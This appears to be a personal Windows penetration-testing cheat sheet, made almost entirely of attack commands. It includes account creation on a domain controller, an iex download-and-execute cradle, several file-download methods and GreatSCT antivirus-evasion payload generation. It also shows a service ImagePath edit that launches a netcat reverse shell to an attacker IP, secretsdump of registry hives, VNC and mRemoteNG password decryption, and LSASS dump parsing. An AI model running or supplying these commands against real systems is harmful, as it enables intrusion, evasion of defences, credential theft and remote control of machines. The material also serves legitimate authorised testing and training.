# Commands
## User related
```powershell
# User info
whoami /all

# User info
net user

# Show groups
net group

# Show local groups
net localgroup <groupname>

# Add user to group
net group <groupname> /add <username>

# Create account
net user <username> <password> /add

# Create account (AD)
# This will force the command to execute on the domain controller instead of the local computer
net user <username> <password> /add /domain
```

## Basic
### System
```powershell
# Shows info about system (Look whether HotFixes are applied or not)
systeminfo

# Show drives
powershell -c get-psdrive -psprovider filesystem

# Show hidden data streams
dir /R

# List Defender Exclusions (Requires local admin privileges)
Get-MpPreference | select Exclusion*

# PowerShell Logging Status
[Bool](Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue).EnableTranscripting
[Bool](Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging' -ErrorAction SilentlyContinue).EnableModuleLogging
[Bool](Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -ErrorAction SilentlyContinue).EnableScriptBlockLogging

# Download and execute files
iex(new-object net.webclient).downloadstring('remote_file')
```
### Download files
```powershell
# Method 1
(new-object net.webclient).downloadfile(<remote_file>,<output_file>)

# Method 2
Invoke-WebRequest -Uri <source> -OutFile <output_file>

# Method 3
Import-Module BitsTransfer
Start-BitsTransfer -Source <url> -Destination <output_file>

# Method 4
certutil -urlcache -f <url> output_file<>
```


# Directories to check
```bash
# Powershell history log file
C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# See any suspicious apps 
"C:\Program Files" or "C:\Program Files (x86)"

# Apps on old windows versions
C:\Data\Users\app

# Code policies and passwords in files
C:\program files\windowspowershell\modules\packagemanagement

# Config files
C:\Windows\System32\config

# AD database file location
C:\Windows\NTDS
```



# AV evasion
## GreatSCT
```sh
# Download
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT.py
```sh
use 1
list
use 9
set lhost <ip>
sel lport <port>
generate
```
Now start the lister with `msfconsole -r file.rc` and execute the xml payload with:
```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

## References
- [https://book.hacktricks.xyz/windows-hardening/av-bypass#greatsct](https://book.hacktricks.xyz/windows-hardening/av-bypass#greatsct)


# accesschk.exe
AccessChk is a command-line tool for viewing the effective permissions on files, registry keys, services, processes, kernel objects, and more. This tool will be helpful to identify whether the current user can modify files within a certain service directory.      

**Download from [here](https://github.com/ankh2054/windows-pentest).**  
```bat
:: Accept eula
accesschk.exe /accepteula

:: Access to services
accesschk.exe <user> -kwsu HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services

:: Services access
accesschk.exe -uwcqv Users *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *

:: Weak folder permission per drive
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
```    

## Edit service
```bat
:: Get info
sc query <service>
reg query HKLM\System\CurrentControlSet\Services\<service>

:: Edit info
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\<service>" /t <type> /v <value> /d <data> /f

:: Edit ImagePath and execute netcat command (assuming nc was uploaded before)
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\<service>" /t <type> /v ImagePath /d "nc.exe <ip> <port> -e powershell.exe" /f
```

## References
- [https://snowscan.io/htb-writeup-control/#](https://snowscan.io/htb-writeup-control/#)
- [https://steflan-security.com/windows-privilege-escalation-weak-permission/](https://steflan-security.com/windows-privilege-escalation-weak-permission/)



# Config files
Most config files can be found in `C:\Windows\System32\config`     

## Get info from registry hive
```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```


# Mount windows shares and VHD files
The Common Internet File System (CIFS) is a network file-sharing protocol. CIFS is a form of SMB.    
```bash
mount -t cifs //<ip>/<share> <mount_dir> -o user=<username>,password=<password>
```

## Mount VHD files
One can use `guestmount` to mount a guest filesystem on the host.     
Install with: `apt install libguestfs-tools`

```bash
guestmount --add <vhd_file> --inspector --ro <mount_dir>
```

### References
- [https://linux.die.net/man/1/guestmount](https://linux.die.net/man/1/guestmount)



# VNC passwords
## Bash
VNC stores passwords as a hex string in `.vnc` files using a default encryption key
```bash
# Decrypt password
echo -n <string> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```

## vncpasswd.py
[Documentation](https://github.com/trinitronx/vncpasswd.py)
```bash
python vncpasswd.py -d -f <hashfile>

```   
## References
- [https://github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts)
- [https://github.com/billchaison/VNCDecrypt](https://github.com/billchaison/VNCDecrypt)
- [https://github.com/trinitronx/vncpasswd.py](https://github.com/trinitronx/vncpasswd.py)


# Softwares / Processes
## LSASS process
Local Security Authority Server Service is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system     
**From these processes, one might be able to harvest credentials from process's dump file**

### Dump
**[Documentation](https://github.com/skelsec/pypykatz)**
```bash
pypykatz lsa minidump <lsass_dump_file>
``` 

## References
- [https://attack.mitre.org/techniques/T1003/001/](https://attack.mitre.org/techniques/T1003/001/)

## mRemoteNG
mRemoteNG is a remote connection management tool, it allows the user to save passwords for various types of connections. There is a file in the user's AppData directory, confCons.xml, that holds that information:

### confCons.xml
One can use **[mremoteng-decrypt](https://github.com/kmahyyg/mremoteng-decrypt)** to crack the password from the config file.     
```bash
python3 mremoteng_decrypt.py -s <string>
```

# Analyse office files
Modern `Office` documents are just zip archives with XML files so, just unzip it and look for data within the XML files.
```bash
unzip <file>
```

## oletools
```bash
# Download tools
sudo pip3 install -U oletools

# Extract macros
olevba -c <file>
```

# OS command injection
Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.
## References
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)